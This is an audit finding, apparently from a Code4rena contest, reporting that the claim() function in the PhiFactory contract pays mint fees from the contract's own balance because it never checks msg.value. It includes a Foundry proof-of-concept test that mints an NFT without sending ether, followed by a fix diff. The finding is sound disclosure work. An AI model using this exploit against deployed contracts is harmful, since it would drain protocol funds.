# Vulnerability details

`PhiFactory` allows minting of NFT using [`claim()`](https://github.com/code-423n4/2024-08-phi/blob/main/src/PhiFactory.sol#L264-L304) function, which calls the `merkleClaim()` and `signatureClaim()` functions.
However, the `claim()` function does not verify whether the user is sending ether to the contract, leading to potential misuse of protocol funds to cover the `creatorFee`.

```solidity
__ SNIP __
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
            uint256 mintFee = getArtMintFee(artId, quantity_);
@>          this.merkleClaim{ value: mintFee }(proof, claimData, mintArgs, leafPart_);
__ SNIP __
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
            uint256 mintFee = getArtMintFee(artId, quantity_);
@>          this.signatureClaim{ value: mintFee }(signature_, claimData, mintArgs);
__ SNIP __
```

This design flaw allows users to mint NFTs without paying the fee out-of-pocket, as the contract’s balance can be used instead. Attackers can exploit this by creating an art and subsequently calling `claim()` function to drain the contract’s balance.

## Impact

The primary risk is that the contract's funds could be drained or misused. Attackers could deplete the contract balance by exploiting this vulnerability, or use the contract’s funds to cover `creatorFee` instead of paying out of their own funds.

## Proof of Concept

The following code snippet is a test case to show this exploit scenario.

```solidity
    function test_claim_without_pay_fee() public {
        _createArt(ART_ID_URL_STRING);
        uint256 artId = 1;
        bytes32 advanced_data = bytes32("1");
        bytes memory signData =
            abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, advanced_data);
        bytes32 msgHash = keccak256(signData);
        bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
        if (v != 27) s = s | bytes32(uint256(1) << 255);
        bytes memory signature = abi.encodePacked(r, s);
        bytes memory data =
            abi.encode(1, participant, referrer, verifier, expiresIn, uint256(1), advanced_data, IMAGE_URL, signature);
        bytes memory dataCompressed = LibZip.cdCompress(data);
        uint256 totalMintFee = phiFactory.getArtMintFee(1, 1);
        // add balance to PhiFatory
        vm.deal(address(phiFactory), totalMintFee);

        vm.startPrank(participant, participant);
        // call claim() function without send ether
        phiFactory.claim(dataCompressed);

        // referrer payout
        address artAddress = phiFactory.getArtAddress(1);
        assertEq(IERC1155(artAddress).balanceOf(participant, 1), 1, "particpiant erc1155 balance");
    }
```

## Recommended Mitigation Steps

The `claim()` function should use `msg.value` instead of calculating the fee internally when calling `merkleClaim()` or `signatureClaim()`. This ensures that the fee is paid directly by the user calling `claim()`, preventing misuse of contract funds.

```diff
__ SNIP __
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
-           uint256 mintFee = getArtMintFee(artId, quantity_);
-           this.merkleClaim{ value: mintFee }(proof, claimData, mintArgs, leafPart_);
+           this.merkleClaim{ value: msg.value }(proof, claimData, mintArgs, leafPart_);
__ SNIP __
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
-           uint256 mintFee = getArtMintFee(artId, quantity_);
-           this.signatureClaim{ value: mintFee }(signature_, claimData, mintArgs);
+           this.signatureClaim{ value: msg.value }(signature_, claimData, mintArgs);
__ SNIP __
```
